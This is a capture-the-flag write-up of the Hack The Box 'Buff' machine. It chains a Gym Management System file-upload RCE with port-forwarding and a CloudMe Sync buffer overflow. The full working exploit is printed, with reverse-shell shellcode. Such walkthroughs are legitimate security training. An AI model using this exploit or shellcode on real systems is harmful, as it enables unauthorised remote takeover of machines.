---
layout: single
title: Buff - Hack The Box
excerpt: "Buff is pretty straightforward: Use a public exploit against the Gym Management System, then get RCE. Do some port-forwarding, then use another exploit (buffer overflow against Cloudme Sync) to get Administrator access."
date: 2020-11-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-buff/buff_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - buffer overflow
  - cve
  - windows
  - file upload
  - cloudme sync
---

![](/assets/images/htb-writeup-buff/buff_logo.png)

Buff is pretty straightforward: Use a public exploit against the Gym Management System, then get RCE. Do some port-forwarding, then use another exploit (buffer overflow against Cloudme Sync) to get Administrator access.

## Summary

- Use unauthenticated file upload vulnerability in Gym Management System 1.0 to get RCE
- Exploit a buffer overflow vulnerability in the CloudMe Sync application to get RCE as Administrator

## Portscan

![image-20200726162532670](/assets/images/htb-writeup-buff/image-20200726162532670.png)

## Website

There's a PHP web application running on port 8080 and it looks like it's a fitness/gym website.

![image-20200726161829858](/assets/images/htb-writeup-buff/image-20200726161829858.png)

![image-20200726162013695](/assets/images/htb-writeup-buff/image-20200726162013695.png)

![image-20200726162040519](/assets/images/htb-writeup-buff/image-20200726162040519.png)

![image-20200726162116526](/assets/images/htb-writeup-buff/image-20200726162116526.png)

The Contact page shows a possible software name / version which we'll look up on Exploit-DB.

![image-20200726162202199](/assets/images/htb-writeup-buff/image-20200726162202199.png)

Exploit-DB has a match for Gym Management System 1.0. At the bottom of every page on the website we see `projectworlds.in` so it's a fair guess that this is the software running this website.

![image-20200726162258198](/assets/images/htb-writeup-buff/image-20200726162258198.png)

Luckily for us, the exploit is unauthenticated and provides remote execution so we don't need anything else to get started.

```
# Exploit Title: Gym Management System 1.0 - Unauthenticated Remote Code Execution
# Exploit Author: Bobby Cooke
# Date: 2020-05-21
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
# Exploit Tested Using: Python 2.7.17
# Vulnerability Description: 
#   Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
[...]
```

## Gym Management System exploitation

The exploit provides a nice pseudo-shell which is useful for looking around and running other commands. We can see our initial shell is running as user **Shaun** and that we can get the first flag.

![image-20200726162806589](/assets/images/htb-writeup-buff/image-20200726162806589.png)

## Priv esc

Checking the open ports on the machine, we see there's a MySQL instance running on port 3306 and something else running on port 8888.

![image-20200726163049549](/assets/images/htb-writeup-buff/image-20200726163049549.png)

On Exploit-DB we can find a few vulnerabilities for CloudMe Sync. I've highlighted the exploit I used. The CloudMe Sync software is not compiled with any of the protections enabled like ASLR and DEP so a good old buffer overflow with shellcode executable on the stack will work fine.

![image-20200726185742784](/assets/images/htb-writeup-buff/image-20200726185742784.png)

We'll need to do some port-forwarding to be able to reach port 8888 with our exploit. I could use plink or metasploit to do that but instead I'll use the https://github.com/xct/xc reverse shell tool. I'll transfer the tool with smbclient.py from impacket then rename it to contain my IP address and port. It's an optional feature of xc which is nice in case you can execute a file but can't pass any parameters to it.

![image-20200726184935454](/assets/images/htb-writeup-buff/image-20200726184935454.png)

After catching the reverse shell with xc, we'll use the `!portfwd` command to redirect port 8888 on our local machine to port 8888 on the remote box.

![image-20200726185112725](/assets/images/htb-writeup-buff/image-20200726185112725.png)

Next, we'll generate a shellcode that'll spawn a reverse shell. The output is in Python3 format (it contains the b before the string indicating it's a byte type). I'll clean that up and rename buf to shellcode and stick it in the downloaded exploit.

![image-20200726185959460](/assets/images/htb-writeup-buff/image-20200726185959460.png)

Final exploit shown below:

```python
#######################################################
# Exploit Title: Local Buffer Overflow on CloudMe Sync v1.11.0
# Date: 08.03.2018
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1110.exe
# Category: Local
# Exploit Discovery: Prasenjit Kanti Paul
# Web: http://hack2rule.wordpress.com/
# Version: 1.11.0
# Tested on: Windows 7 SP1 x86
# CVE: CVE-2018-7886
# Solution: Update CloudMe Sync to 1.11.2
#######################################################

#Disclosure Date: March 12, 2018
#Response Date: March 14, 2018
#Bug Fixed: April 12, 2018

# Run this file in victim's win 7 sp1 x86 system where CloudMe Sync 1.11.0 has been installed.

import socket

target="127.0.0.1" 

junk="A"*1052

eip="\x7B\x8A\xA9\x68"		#68a98a7b : JMP ESP - Qt5Core.dll

shellcode =  ""
shellcode += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shellcode += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shellcode += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shellcode += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shellcode += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shellcode += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shellcode += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shellcode += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shellcode += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shellcode += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shellcode += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shellcode += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shellcode += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
shellcode += "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
shellcode += "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x15\x68"
shellcode += "\x02\x00\x15\xb3\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
shellcode += "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
shellcode += "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
shellcode += "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
shellcode += "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
shellcode += "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
shellcode += "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
shellcode += "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
shellcode += "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shellcode += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

payload=junk+eip+shellcode

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,8888))
s.send(payload)
```

The exploit triggers the buffer overflow, executes our shellcode and spawn a reverse shell which we catch with a netcat listener.

![image-20200726190204674](/assets/images/htb-writeup-buff/image-20200726190204674.png)